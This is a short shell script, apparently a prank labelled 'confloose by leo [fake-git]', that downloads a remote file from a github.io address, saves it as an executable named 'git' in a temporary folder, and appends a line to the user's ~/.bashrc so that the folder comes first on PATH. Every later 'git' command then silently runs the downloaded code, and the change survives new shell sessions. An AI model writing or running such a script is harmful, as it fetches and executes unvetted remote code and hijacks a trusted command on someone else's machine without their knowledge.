#!/bin/sh

tempdir=$(mktemp -d)

curl "https://d-002.github.io/epita/confloose/fake-git/git.sh" >> "$tempdir/git"
chmod +x "$tempdir/git"
echo "export PATH=\"$tempdir:$PATH\"; test \"confloose by leo [fake-git]\"" >> "$HOME/.bashrc"
export PATH="$tempdir:$PATH"
